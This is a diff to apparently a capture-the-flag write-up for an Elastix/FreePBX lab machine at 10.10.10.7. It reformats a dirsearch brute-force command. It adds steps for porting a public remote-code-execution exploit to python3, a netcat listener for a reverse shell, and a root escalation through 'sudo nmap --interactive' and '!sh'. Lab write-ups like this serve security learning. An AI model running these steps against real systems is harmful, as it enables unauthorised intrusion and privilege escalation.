@@ -28,14 +28,35 @@ sslscan 10.10.10.7
 
 ### 🔍 Directory Bruteforce
 ```bash
-dirsearch.py -u https://10.10.10.7/ \
--w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
--e txt,php -t 50
+dirsearch.py -u https://10.10.10.7/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e txt,php -t 50
 ```
 
 > Notable: `/admin`, `/vtigercrm`, `/recordings`, `/configs`, `/mail`, `/panel`
 
 ---
+
+[Elastix Exploit](https://github.com/A1vinSmith/FreePBX-2.10.0---Elastix-2.2.0---Remote-Code-Execution/blob/master/exploit.py)  -> change to python3
+
+```
+import urllib2 -> from urllib import request
+```
+
+```
+change urllib2 on the bottom to request
+```
+
+use exploit
+
+```bash
+rlwrap nc -lvnp 4444
+```
+
+elevate priv
+
+```bash
+sudo nmap --interactive  
+!sh
+```
 
 ## 🗂️ Local File Inclusion (LFI)
 
